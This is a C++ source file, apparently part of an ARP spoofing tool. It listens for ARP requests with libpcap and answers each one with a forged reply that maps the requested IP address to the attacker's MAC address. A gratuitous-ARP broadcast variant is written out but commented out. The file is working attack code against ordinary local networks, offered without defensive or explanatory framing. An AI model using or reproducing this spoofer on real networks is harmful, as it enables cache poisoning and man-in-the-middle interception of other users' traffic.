// arpAttack.cpp

#include <arpa/inet.h>
#include "ArpAttack.h"


void analysis_packet(u_char* args, 
	const struct pcap_pkthdr* header, const u_char* packet) {
	ArpAttack* arp_attack = (ArpAttack*)args;
	pcap_t* dev = arp_attack->dev;
	// pcap_t* dev = (pcap_t*)args;
	ethhdr* ether = (ethhdr*)packet;
	ether_arp* ethernet_arp = (ether_arp*)(packet + sizeof(*ether));

	Arp* arp = new Arp();
	Arp* gratuitous_arp = new Arp();

	if (0x01 == htons(ethernet_arp->ea_hdr.ar_op)) {	// ARP ask
		arp->setArpTha(ether->h_source);
		arp->setArpSha(arp_attack->mac);

		arp->setArpOP(htons(0x02));

		arp->setArpTpa(ethernet_arp->arp_spa);
		arp->setArpSpa(ethernet_arp->arp_tpa);

		arp->send_packet(dev);


		// Send Gratuitous ARP
		// unsigned char mac[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
		// unsigned char mac2[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
		// gratuitous_arp->setArpTha(mac);
		// gratuitous_arp->ether_header->setDstMac(mac2);
		// gratuitous_arp->setArpSha(arp_attack->mac);
		// gratuitous_arp->setArpOP(htons(0x01));
		// gratuitous_arp->setArpTpa(ethernet_arp->arp_spa);
		// gratuitous_arp->setArpSpa(ethernet_arp->arp_tpa);
		// gratuitous_arp->send_packet(dev);
	}

	delete arp;

}

void ArpAttack::run() {
	struct bpf_program filter;
	int ret;
	ret = pcap_compile(dev, &filter, "arp", 0, PCAP_NETMASK_UNKNOWN);
	assert (0 == ret);
	ret = pcap_setfilter(dev, &filter);
	assert (0 == ret);

	pcap_loop(dev, -1, analysis_packet, (u_char*)this);
}